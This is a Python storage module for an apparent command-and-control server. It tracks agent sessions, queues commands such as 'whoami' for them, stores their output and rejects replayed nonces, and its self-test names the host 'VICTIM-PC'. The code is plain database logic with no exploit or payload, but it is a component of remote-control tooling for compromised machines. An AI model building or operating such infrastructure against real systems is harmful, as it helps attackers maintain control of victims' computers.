import time
import aiosqlite

from common import config
from common.logger import get_logger

logger = get_logger('storage')

DB_PATH = 'c2_server.db'
NONCE_EXPIRY_SECONDS = 86400  # 24 hours


# Schema
_CREATE_SESSIONS = """
CREATE TABLE IF NOT EXISTS sessions (
    session_id  TEXT PRIMARY KEY,
    hostname    TEXT NOT NULL,
    username    TEXT NOT NULL,
    os          TEXT NOT NULL,
    agent_ver   TEXT NOT NULL,
    first_seen  REAL NOT NULL,
    last_seen   REAL NOT NULL,
    jitter_pct  INTEGER NOT NULL,
    active      INTEGER NOT NULL DEFAULT 1
)"""

_CREATE_TASKS = """
CREATE TABLE IF NOT EXISTS tasks (
    task_id    TEXT PRIMARY KEY,
    session_id TEXT NOT NULL,
    command    TEXT NOT NULL,
    args       TEXT NOT NULL,
    timeout_s  INTEGER NOT NULL,
    queued_at  REAL NOT NULL,
    status     TEXT NOT NULL
)"""

_CREATE_RESULTS = """
CREATE TABLE IF NOT EXISTS results (
    result_id   TEXT PRIMARY KEY,
    task_id     TEXT NOT NULL,
    stdout      TEXT NOT NULL,
    stderr      TEXT NOT NULL,
    exit_code   INTEGER NOT NULL,
    duration_ms INTEGER NOT NULL,
    received_at REAL NOT NULL
)"""

# received_at stored as float for fast range queries in prune_old_nonces
_CREATE_NONCES = """
CREATE TABLE IF NOT EXISTS nonces (
    nonce       TEXT PRIMARY KEY,
    received_at REAL NOT NULL
)"""


# Database 
class Database:
    # Async context manager wrapping an aiosqlite connection.

    def __init__(self, db_path: str = DB_PATH):
        self._db_path = db_path
        self._conn: aiosqlite.Connection = None

    async def __aenter__(self):
        self._conn = await aiosqlite.connect(self._db_path)
        self._conn.row_factory = aiosqlite.Row  # rows accessible by column name
        await self._create_tables()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._conn:
            await self._conn.close()
        return False

    async def _create_tables(self):
        # Creates all four tables on first connection if they do not exist
        async with self._conn.executescript(
            f"{_CREATE_SESSIONS};"
            f"{_CREATE_TASKS};"
            f"{_CREATE_RESULTS};"
            f"{_CREATE_NONCES};"
        ):
            pass
        await self._conn.commit()


    # Sessions
    async def insert_session(self, session_id: str, hostname: str, username: str,
                              os: str, agent_ver: str, jitter_pct: int) -> None:
        # Insert a new session row with active=1 and first_seen/last_seen set to now
        now = time.time()
        await self._conn.execute(
            """INSERT INTO sessions
               (session_id, hostname, username, os, agent_ver,
                first_seen, last_seen, jitter_pct, active)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)""",
            (session_id, hostname, username, os, agent_ver, now, now, jitter_pct),
        )
        await self._conn.commit()
        logger.info('session inserted', extra={'session_id': session_id, 'hostname': hostname})

    async def get_session(self, session_id: str) -> aiosqlite.Row | None:
        # Return the session row for session_id, or None if not found
        async with self._conn.execute(
            "SELECT * FROM sessions WHERE session_id = ?", (session_id,)
        ) as cursor:
            return await cursor.fetchone()

    async def update_last_seen(self, session_id: str) -> None:
        # Update last_seen timestamp for an active session
        await self._conn.execute(
            "UPDATE sessions SET last_seen = ? WHERE session_id = ?",
            (time.time(), session_id),
        )
        await self._conn.commit()

    async def deactivate_session(self, session_id: str) -> None:
        # Mark a session as inactive (active = 0)
        await self._conn.execute(
            "UPDATE sessions SET active = 0 WHERE session_id = ?",
            (session_id,),
        )
        await self._conn.commit()
        logger.info('session deactivated', extra={'session_id': session_id})

    async def list_sessions(self) -> list:
        # Return all session rows ordered by last_seen descending
        async with self._conn.execute(
            "SELECT * FROM sessions ORDER BY last_seen DESC"
        ) as cursor:
            return await cursor.fetchall()

    # -----------------------------------------------------------------------
    # Tasks
    # -----------------------------------------------------------------------

    async def insert_task(self, task_id: str, session_id: str, command: str,
                          args: str, timeout_s: int) -> None:
        # Insert a new task row with status PENDING
        await self._conn.execute(
            """INSERT INTO tasks
               (task_id, session_id, command, args, timeout_s, queued_at, status)
               VALUES (?, ?, ?, ?, ?, ?, 'PENDING')""",
            (task_id, session_id, command, args, timeout_s, time.time()),
        )
        await self._conn.commit()
        logger.info('task queued',
                    extra={'session_id': session_id, 'task_id': task_id, 'command': command})

    async def update_task_status(self, task_id: str, status: str) -> None:
        # Update the status field of a task row
        await self._conn.execute(
            "UPDATE tasks SET status = ? WHERE task_id = ?",
            (status, task_id),
        )
        await self._conn.commit()

    async def get_pending_task(self, session_id: str) -> aiosqlite.Row | None:
        # Return the oldest PENDING task for a session, or None
        async with self._conn.execute(
            """SELECT * FROM tasks
               WHERE session_id = ? AND status = 'PENDING'
               ORDER BY queued_at ASC LIMIT 1""",
            (session_id,),
        ) as cursor:
            return await cursor.fetchone()

    async def get_tasks_for_session(self, session_id: str) -> list:
        # Return all task rows for a session ordered by queued_at
        async with self._conn.execute(
            "SELECT * FROM tasks WHERE session_id = ? ORDER BY queued_at ASC",
            (session_id,),
        ) as cursor:
            return await cursor.fetchall()


    # Results
    async def insert_result(self, result_id: str, task_id: str, stdout: str,
                             stderr: str, exit_code: int, duration_ms: int) -> None:
        # Insert a task result row.
        await self._conn.execute(
            """INSERT INTO results
               (result_id, task_id, stdout, stderr, exit_code, duration_ms, received_at)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (result_id, task_id, stdout, stderr, exit_code, duration_ms, time.time()),
        )
        await self._conn.commit()
        logger.info('result stored', extra={'task_id': task_id, 'exit_code': exit_code})

    async def get_results_for_session(self, session_id: str) -> list:
        # Return all results for tasks belonging to a session via JOIN
        async with self._conn.execute(
            """SELECT r.* FROM results r
               JOIN tasks t ON r.task_id = t.task_id
               WHERE t.session_id = ?
               ORDER BY r.received_at ASC""",
            (session_id,),
        ) as cursor:
            return await cursor.fetchall()


    # Nonces
    async def check_and_store_nonce(self, nonce: str) -> bool:
        # Return True and store nonce if unseen in last 24h, False if replay detected.
        cutoff = time.time() - NONCE_EXPIRY_SECONDS

        async with self._conn.execute(
            "SELECT 1 FROM nonces WHERE nonce = ? AND received_at > ?",
            (nonce, cutoff),
        ) as cursor:
            existing = await cursor.fetchone()

        if existing:
            logger.warning('nonce replay detected', extra={'nonce': nonce})
            return False

        await self._conn.execute(
            "INSERT OR REPLACE INTO nonces (nonce, received_at) VALUES (?, ?)",
            (nonce, time.time()),
        )
        await self._conn.commit()
        await self.prune_old_nonces()  # keep nonces table lean on every write
        return True

    async def prune_old_nonces(self) -> None:
        # Delete nonce rows older than 24 hours.
        cutoff = time.time() - NONCE_EXPIRY_SECONDS
        await self._conn.execute(
            "DELETE FROM nonces WHERE received_at < ?", (cutoff,)
        )
        await self._conn.commit()


# Self-test
if __name__ == '__main__':
    import asyncio
    import uuid

    async def _test():
        print("Running storage self-test...")

        async with Database(':memory:') as db:

            sid = str(uuid.uuid4())
            await db.insert_session(sid, 'VICTIM-PC', 'jdoe', 'Windows 10', '1.0.0', 20)
            row = await db.get_session(sid)
            assert row['hostname'] == 'VICTIM-PC', "FAIL: insert_session / get_session"
            print("  [OK] insert_session / get_session")

            await db.update_last_seen(sid)
            print("  [OK] update_last_seen")

            sessions = await db.list_sessions()
            assert len(sessions) == 1
            print("  [OK] list_sessions")

            tid = str(uuid.uuid4())
            await db.insert_task(tid, sid, 'whoami', '[]', 30)
            task = await db.get_pending_task(sid)
            assert task['command'] == 'whoami', "FAIL: insert_task / get_pending_task"
            print("  [OK] insert_task / get_pending_task")

            await db.update_task_status(tid, 'DISPATCHED')
            assert await db.get_pending_task(sid) is None, "FAIL: dispatched task should not appear as pending"
            print("  [OK] update_task_status")

            rid = str(uuid.uuid4())
            await db.insert_result(rid, tid, 'VICTIM-PC\\jdoe', '', 0, 55)
            results = await db.get_results_for_session(sid)
            assert len(results) == 1
            assert results[0]['stdout'] == 'VICTIM-PC\\jdoe', "FAIL: insert_result / get_results_for_session"
            print("  [OK] insert_result / get_results_for_session")

            nonce = uuid.uuid4().hex
            assert await db.check_and_store_nonce(nonce) is True, "FAIL: first nonce should return True"
            assert await db.check_and_store_nonce(nonce) is False, "FAIL: replay should return False"
            print("  [OK] check_and_store_nonce — replay correctly rejected")

            await db.prune_old_nonces()
            print("  [OK] prune_old_nonces")

            await db.deactivate_session(sid)
            row = await db.get_session(sid)
            assert row['active'] == 0
            print("  [OK] deactivate_session")

        print("\nAll storage self-tests passed.")

    asyncio.run(_test())